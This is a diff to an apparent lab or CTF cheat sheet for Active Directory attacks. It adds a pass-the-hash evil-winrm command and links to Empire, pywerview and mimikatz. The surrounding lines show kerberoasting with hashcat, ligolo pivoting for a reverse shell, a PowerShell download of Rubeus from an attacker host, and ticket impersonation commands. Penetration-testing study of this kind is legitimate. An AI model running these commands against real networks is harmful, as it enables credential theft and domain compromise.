@@ -137,6 +137,11 @@ hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.
 net rpc password AUDIT2020 -U BLACKFIELD\\support -S BLACKFIELD.local (prompts new password)
 ```
 
+[Pass The Hash]
+```
+evil-winrm -u James -H 8af1903d3c80d3552a84b6ba296db2ea -i 192.168.110.53 (obtain through mimikatz dump)
+```
+
 ## Credential Dumping
 **[LSASS Dump - lsass.DMP](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf)**
 
@@ -218,7 +223,6 @@ start
 sudo ip route add 192.168.110.0/24 dev ligolo
 
 listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444 (open port on DMZ machine for reverse shell)
-listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:8000 (open port on DMZ machine for file transfer)
 
 powershell -Command "Invoke-WebRequest -Uri 'http://192.168.110.51:1235/Rubeus.exe' -OutFile 'Rubeus.exe'"
 ```
@@ -227,6 +231,8 @@ powershell -Command "Invoke-WebRequest -Uri 'http://192.168.110.51:1235/Rubeus.e
   - [Advanced pivoting guide](https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5)
 
 **[Rubeus for Windows](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)**
+
+**[Pywerview - Linux AD Enumeration](https://github.com/the-useless-one/pywerview)**
 
 ```
 Rubeus.exe dump /luci:0x599ac7 /service:CIFS/dc.painters.htb /nowrap /outfile [dump to kirbi files]
@@ -247,7 +253,14 @@ OR
 getST.py -spn "cifs/dc.painters.htb" -impersonate "administrator" "painters/blake:Password123\!" -dc-ip 192.168.110.55
 ```
 
+**[Empire - Post-exploitation Framework](https://github.com/BC-SECURITY/Empire)**
+
+
 **[Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)**
+
+**Additional Resources**
+  - [Mimikatz Post Exploitation Basics](https://infosecwriteups.com/post-exploitation-basics-in-active-directory-enviorment-by-hashar-mujahid-d46880974f87)**
+
 
 **[Wordlists](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/#hashcat-install)**
 
